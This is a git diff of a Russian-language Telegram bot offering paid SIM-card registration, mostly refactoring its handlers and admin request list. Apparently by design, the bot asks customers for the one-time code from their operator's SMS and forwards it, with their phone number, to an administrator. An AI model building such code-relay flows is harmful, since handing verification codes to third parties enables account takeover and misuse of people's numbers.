@@ -142,13 +142,9 @@ async def cmd_start(message: Message):
 async def show_price(message: Message):
     text = (
         f"{PRICE_TEXT}\n\n"
-        "После успешной регистрации SIM-карты вы получите сообщение с реквизитами для оплаты.\n"
-        "Оплата за 1 номер — 2.5 USD (или эквивалент в KZT, RUB и т.д.).\n\n"
-        "Принимаем:\n"
-        "• USDT (TRC20 / BEP20)\n"
-        "• Kaspi / Halyk / Freedom Finance\n"
-        "• Банковский перевод\n\n"
-        "При оплате обязательно укажите номер заявки!"
+        "После успешной регистрации вы получите реквизиты для оплаты.\n"
+        "Принимаем USDT, Kaspi, Halyk, Freedom, перевод.\n"
+        "Укажите номер заявки при оплате."
     )
     await message.answer(text, parse_mode="Markdown", reply_markup=get_main_kb())
 
@@ -183,9 +179,8 @@ async def process_phone(message: Message, state: FSMContext):
             "Правильные примеры:\n"
             "• +77001234567\n"
             "• 87051234567\n"
-            "• +77471234567\n"
-            "• 87771234567\n\n"
-            "Попробуй ввести ещё раз:"
+            "• +77471234567\n\n"
+            "Попробуй ещё раз:"
         )
         return
 
@@ -237,7 +232,152 @@ async def back_to_menu(message: Message, state: FSMContext):
     await state.clear()
     await message.answer("Главное меню", reply_markup=get_main_kb())
 
-# ================= АДМИН ПАНЕЛЬ =================
+# ================= CALLBACK ХЕНДЛЕРЫ =================
+@router.callback_query(F.data.startswith("reg_"))
+async def start_registration(callback: CallbackQuery):
+    if callback.from_user.id != ADMIN_ID:
+        await callback.answer("Доступ запрещён", show_alert=True)
+        return
+
+    try:
+        rid = int(callback.data.split("_")[1])
+    except:
+        await callback.answer("Ошибка в номере заявки", show_alert=True)
+        return
+
+    for req in pending_requests:
+        if req["id"] == rid and req["status"] == "pending":
+            req["status"] = "waiting_sms_code"
+            req["dialog_active"] = True
+
+            await callback.message.edit_text(
+                callback.message.text + "\n\n🔄 Запрос кода SMS отправлен клиенту...",
+                reply_markup=None
+            )
+
+            await bot.send_message(
+                req["user_id"],
+                "✅ Администратор начал регистрацию.\n\n"
+                "Введите **код из SMS**, который пришёл на ваш номер от оператора.\n"
+                "(обычно 4–6 цифр)\n\n"
+                "Просто напишите его сюда:"
+            )
+
+            await bot.send_message(
+                ADMIN_ID,
+                f"Заявка #{rid}: ожидание кода SMS от клиента."
+            )
+
+            await save_data()
+            await callback.answer("Запрос кода отправлен клиенту")
+            return
+
+    await callback.answer("Заявка уже обработана или не найдена", show_alert=True)
+
+
+@router.callback_query(F.data.startswith("rej_"))
+async def reject_request(callback: CallbackQuery):
+    if callback.from_user.id != ADMIN_ID:
+        await callback.answer("Доступ запрещён", show_alert=True)
+        return
+
+    try:
+        rid = int(callback.data.split("_")[1])
+    except:
+        await callback.answer("Ошибка в номере заявки", show_alert=True)
+        return
+
+    for req in pending_requests:
+        if req["id"] == rid and req["status"] == "pending":
+            req["status"] = "rejected"
+            req["dialog_active"] = False
+
+            await bot.send_message(req["user_id"], f"❌ Заявка #{rid} отклонена.")
+            await callback.message.edit_text(callback.message.text + f"\n\n❌ Отклонено #{rid}")
+            await save_data()
+            await callback.answer("Заявка отклонена")
+            return
+
+    await callback.answer("Заявка уже обработана", show_alert=True)
+
+
+@router.callback_query(F.data.startswith("finish_"))
+async def finish_registration(callback: CallbackQuery):
+    if callback.from_user.id != ADMIN_ID:
+        await callback.answer("Доступ запрещён", show_alert=True)
+        return
+
+    try:
+        rid = int(callback.data.split("_")[1])
+    except:
+        await callback.answer("Ошибка в номере заявки", show_alert=True)
+        return
+
+    for req in pending_requests:
+        if req["id"] == rid and req["status"] in ["sms_received", "waiting_sms_code"]:
+            req["status"] = "registered"
+            req["dialog_active"] = False
+
+            await bot.send_message(
+                req["user_id"],
+                f"🎉 SIM-карта #{rid} успешно зарегистрирована!\n"
+                f"Оператор: {req['operator']}\n"
+                f"Номер: {req['phone']}\n\n"
+                "Спасибо за использование сервиса!"
+            )
+
+            await callback.message.edit_text(
+                callback.message.text + "\n\n✅ Регистрация завершена"
+            )
+
+            await save_data()
+            await callback.answer("Регистрация завершена")
+            return
+
+    await callback.answer("Заявка не готова к завершению", show_alert=True)
+
+
+# ================= ОБЩИЙ ХЕНДЛЕР СООБЩЕНИЙ (для кода SMS и диалога) =================
+@router.message()
+async def handle_dialog_messages(message: Message):
+    if message.chat.id == ADMIN_ID:
+        # Пока админ пишет — ничего не делаем (можно добавить отправку клиенту позже)
+        return
+
+    for req in pending_requests:
+        if req["user_id"] == message.chat.id and req["dialog_active"]:
+            if req["status"] == "waiting_sms_code":
+                code = message.text.strip()
+                if code.isdigit() and 4 <= len(code) <= 6:
+                    req["sms_code"] = code
+                    req["status"] = "sms_received"
+                    await save_data()
+
+                    await message.answer("Код принят. Администратор проверяет...")
+
+                    kb = InlineKeyboardMarkup(inline_keyboard=[
+                        [InlineKeyboardButton("🏁 Завершить регистрацию", callback_data=f"finish_{req['id']}")],
+                        [InlineKeyboardButton("❌ Отклонить", callback_data=f"rej_{req['id']}")]
+                    ])
+
+                    await bot.send_message(
+                        ADMIN_ID,
+                        f"Заявка #{req['id']} — клиент ввёл код SMS: **{code}**\n"
+                        f"Номер: {req['phone']}\n"
+                        f"Оператор: {req['operator']}\n\n"
+                        "Что дальше?",
+                        reply_markup=kb,
+                        parse_mode="Markdown"
+                    )
+                else:
+                    await message.answer("Код должен состоять из 4–6 цифр. Попробуйте ещё раз:")
+                return
+
+            # Если статус другой — просто пересылаем админу
+            await bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
+            return
+
+# ================= АДМИН-ПАНЕЛЬ (оставляем как есть) =================
 @router.message(Command("admin"))
 async def admin_panel(message: Message):
     if message.chat.id != ADMIN_ID:
@@ -259,131 +399,48 @@ async def admin_panel(message: Message):
         reply_markup=kb
     )
 
-# ================= CALLBACKS =================
-@router.callback_query(F.data.startswith("reg_"))
-async def start_registration(callback: CallbackQuery):
-    if callback.from_user.id != ADMIN_ID:
-        await callback.answer("Доступ запрещён", show_alert=True)
-        return
-
-    rid = int(callback.data.split("_")[1])
-
-    for req in pending_requests:
-        if req["id"] == rid and req["status"] == "pending":
-            req["status"] = "waiting_sms_code"
-            req["dialog_active"] = True
-
-            await callback.message.edit_text(
-                callback.message.text + "\n\n🔄 Запрос кода из SMS отправлен клиенту...",
-                reply_markup=None
-            )
-
-            await bot.send_message(
-                req["user_id"],
-                "✅ Администратор начал регистрацию.\n\n"
-                "Введите **код из SMS**, который пришёл на ваш номер от оператора.\n"
-                "(обычно 4–6 цифр)\n\n"
-                "Просто напишите его сюда:"
-            )
-
-            await bot.send_message(
-                ADMIN_ID,
-                f"Заявка #{rid}: ожидание кода из SMS от клиента."
-            )
-
-            await save_data()
-            await callback.answer("Запрос кода отправлен")
-            return
-
-    await callback.answer("Заявка уже обработана", show_alert=True)
-
-@router.callback_query(F.data.startswith("rej_"))
-async def reject_request(callback: CallbackQuery):
-    if callback.from_user.id != ADMIN_ID:
-        await callback.answer("Доступ запрещён", show_alert=True)
-        return
-
-    rid = int(callback.data.split("_")[1])
-    for req in pending_requests:
-        if req["id"] == rid and req["status"] == "pending":
-            req["status"] = "rejected"
-            req["dialog_active"] = False
-            await bot.send_message(req["user_id"], f"✗ Заявка #{rid} отклонена.")
-            await callback.message.edit_text(callback.message.text + f"\n\n❌ Отклонено #{rid}")
-            await save_data()
-            await callback.answer("Отклонено")
-            return
-
-@router.callback_query(F.data.startswith("finish_"))
-async def finish_registration(callback: CallbackQuery):
-    if callback.from_user.id != ADMIN_ID:
-        await callback.answer("Доступ запрещён", show_alert=True)
-        return
-
-    rid = int(callback.data.split("_")[1])
-    for req in pending_requests:
-        if req["id"] == rid and req["status"] in ["sms_received", "waiting_sms_code"]:
-            req["status"] = "registered"
-            req["dialog_active"] = False
-
-            await bot.send_message(
-                req["user_id"],
-                f"🎉 SIM-карта #{rid} успешно зарегистрирована!\n"
-                f"Оператор: {req['operator']}\n"
-                f"Номер: {req['phone']}\n\n"
-                "Спасибо за использование сервиса!"
-            )
-
-            await callback.message.edit_text(
-                callback.message.text + "\n\n✅ Регистрация завершена"
-            )
-
-            await save_data()
-            await callback.answer("Завершено")
-            return
-
-    await callback.answer("Заявка не в нужном статусе", show_alert=True)
-
-# ================= ОБЩИЙ ХЕНДЛЕР ДЛЯ ДИАЛОГА =================
-@router.message()
-async def handle_client_messages(message: Message):
-    if message.chat.id == ADMIN_ID:
-        # Если админ пишет — пока пропускаем (можно добавить логику отправки клиенту)
-        return
-
-    for req in pending_requests:
-        if req["user_id"] == message.chat.id and req["dialog_active"]:
-            if req["status"] == "waiting_sms_code":
-                code = message.text.strip()
-                if code.isdigit() and 4 <= len(code) <= 6:
-                    req["sms_code"] = code
-                    req["status"] = "sms_received"
-                    await save_data()
-
-                    await message.answer("Код принят. Ожидайте, администратор проверяет...")
-
-                    admin_msg = (
-                        f"Заявка #{req['id']} — клиент ввёл код из SMS: **{code}**\n"
-                        f"Номер: {req['phone']}\n"
-                        f"Оператор: {req['operator']}\n\n"
-                        "Что дальше?"
-                    )
-
-                    kb = InlineKeyboardMarkup(inline_keyboard=[
-                        [InlineKeyboardButton("🏁 Завершить регистрацию", callback_data=f"finish_{req['id']}")],
-                        [InlineKeyboardButton("❌ Отклонить", callback_data=f"rej_{req['id']}")]
-                    ])
-
-                    await bot.send_message(ADMIN_ID, admin_msg, reply_markup=kb, parse_mode="Markdown")
-                else:
-                    await message.answer("Код должен состоять из 4–6 цифр. Попробуйте ещё раз:")
-                return
-
-            # Если статус другой — просто форвардим админу
-            await bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
-            return
-
 # ================= СПИСОК ЗАЯВОК (оставляем как было) =================
+async def generate_requests_list(page: int = 1, per_page: int = 8, status: str | None = None, search: str | None = None, field: str = "phone") -> tuple[str, InlineKeyboardMarkup | None]:
+    filtered = [
+        r for r in pending_requests
+        if (status is None or r["status"] == status)
+        and (search is None or search.lower() in str(r.get(field, "")).lower())
+    ]
+
+    total = len(filtered)
+    start = (page - 1) * per_page
+    items = filtered[start : start + per_page]
+
+    if not items:
+        return "Нет подходящих заявок.", None
+
+    lines = [f"Заявки | стр {page}/{max(1, (total + per_page - 1)//per_page)} | всего {total}\n"]
+    for r in items:
+        emoji = "⏳" if r["status"] == "pending" else "✅" if r["status"] == "registered" else "❌"
+        lines.append(f"{emoji} #{r['id']} | {r['operator']} | {r['phone']}")
+        lines.append(f"   @{r['username']} | {r['first_name']} | {r['user_id']}\n")
+
+    text = "".join(lines)
+
+    kb = InlineKeyboardMarkup(inline_keyboard=[])
+
+    for r in items:
+        if r["status"] == "pending":
+            kb.inline_keyboard.append([
+                InlineKeyboardButton(text=f"✅ #{r['id']}", callback_data=f"reg_{r['id']}"),
+                InlineKeyboardButton(text=f"❌ #{r['id']}", callback_data=f"rej_{r['id']}")
+            ])
+
+    if page > 1:
+        kb.inline_keyboard.append([InlineKeyboardButton(text="← Назад", callback_data=f"list_{status or 'all'}_{page-1}")])
+
+    if start + per_page < total:
+        kb.inline_keyboard.append([InlineKeyboardButton(text="Вперёд →", callback_data=f"list_{status or 'all'}_{page+1}")])
+
+    kb.inline_keyboard.append([InlineKeyboardButton(text="↩ Админ меню", callback_data="admin_menu")])
+
+    return text, kb
+
 @router.callback_query(F.data.startswith("list_"))
 async def list_requests(callback: CallbackQuery):
     if callback.from_user.id != ADMIN_ID:
@@ -399,8 +456,6 @@ async def list_requests(callback: CallbackQuery):
     text, kb = await generate_requests_list(page=page, status=status)
     await callback.message.edit_text(text, reply_markup=kb)
     await callback.answer()
-
-# ... (остальные части: generate_requests_list, search, broadcast и т.д. остаются без изменений)
 
 # ================= ЗАПУСК =================
 async def main():
